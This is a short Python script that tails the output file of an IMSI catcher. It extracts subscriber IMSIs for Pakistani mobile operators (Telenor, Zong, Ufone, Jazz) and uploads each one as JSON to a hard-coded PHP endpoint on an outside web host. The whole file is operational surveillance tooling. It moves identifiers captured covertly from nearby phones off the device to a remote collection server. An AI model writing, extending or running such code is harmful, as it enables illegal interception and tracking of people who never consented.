#!/usr/bin/env python3
"""
HTTP Cloud Writer - Sends IMSI data to InfinityFree via PHP
"""

import requests
import os
import re
import time
import json
from datetime import datetime
from pathlib import Path

# Your website URL
API_URL = "http://subhanscode.xo.je/imsi_ingest.php"

class HTTPCloudWriter:
    def __init__(self):
        self.last_position = 0
        self.total_uploaded = 0
        self.failed_attempts = 0
        
    def parse_imsi_line(self, line):
        """Parse IMSI from your catcher output"""
        if not line or line.startswith('Nb IMSI') or line.startswith('stamp'):
            return None
        
        imsi_match = re.search(r'410\s+0[3467]\s+\d+', line)
        if not imsi_match:
            return None
        
        imsi_parts = imsi_match.group(0).split()
        mcc = imsi_parts[0]
        mnc = imsi_parts[1]
        imsi_number = imsi_parts[2]
        full_imsi = f"{mcc}{mnc}{imsi_number}"
        
        operator_map = {
            '06': 'Telenor',
            '04': 'Zong',
            '03': 'Ufone',
            '01': 'Jazz',
            '07': 'Jazz'
        }
        operator = operator_map.get(mnc, 'Unknown')
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        return {
            'timestamp': timestamp,
            'imsi': full_imsi,
            'operator': operator,
            'mcc': mcc,
            'mnc': mnc,
            'cell_id': 0,
            'lac': 0,
            'source_ip': 'imsi_catcher'
        }
    
    def send_to_cloud(self, data):
        """Send data to PHP endpoint"""
        try:
            response = requests.post(
                API_URL,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                return result.get('success', False)
            return False
        except Exception as e:
            print(f"⚠️ HTTP error: {e}")
            return False
    
    def monitor_and_upload(self):
        """Monitor file and upload via HTTP"""
        if not os.path.exists("imsi_output.txt"):
            Path("imsi_output.txt").touch()
        
        print("\n" + "="*70)
        print("☁️  HTTP CLOUD WRITER")
        print("="*70)
        print(f"📡 Monitoring: imsi_output.txt")
        print(f"🌐 Uploading to: {API_URL}")
        print("="*70 + "\n")
        
        with open("imsi_output.txt", "r") as f:
            f.seek(0, 2)
            self.last_position = f.tell()
            
            while True:
                try:
                    line = f.readline()
                    if line:
                        data = self.parse_imsi_line(line)
                        if data:
                            if self.send_to_cloud(data):
                                self.total_uploaded += 1
                                print(f"  ☁️ [{self.total_uploaded}] {data['operator']}: ...{data['imsi'][-8:]}")
                            else:
                                print(f"  ❌ Failed: {data['operator']}")
                    else:
                        time.sleep(2)
                        
                except KeyboardInterrupt:
                    print(f"\n\n👋 Stopped. Total uploaded: {self.total_uploaded}")
                    break
                except Exception as e:
                    print(f"⚠️ Error: {e}")
                    time.sleep(5)

if __name__ == "__main__":
    writer = HTTPCloudWriter()
    writer.monitor_and_upload()
